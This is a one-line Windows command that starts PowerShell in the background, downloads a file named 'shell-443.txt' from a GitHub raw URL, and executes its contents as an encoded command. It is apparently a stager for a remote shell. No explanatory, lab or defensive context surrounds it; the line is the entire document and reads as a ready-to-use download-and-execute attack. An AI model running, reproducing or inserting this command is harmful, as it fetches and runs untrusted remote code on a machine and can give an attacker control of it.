START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('https://github.com/HanzalahH/heloma/raw/main/shell-443.txt');iex 'powershell -E $code'
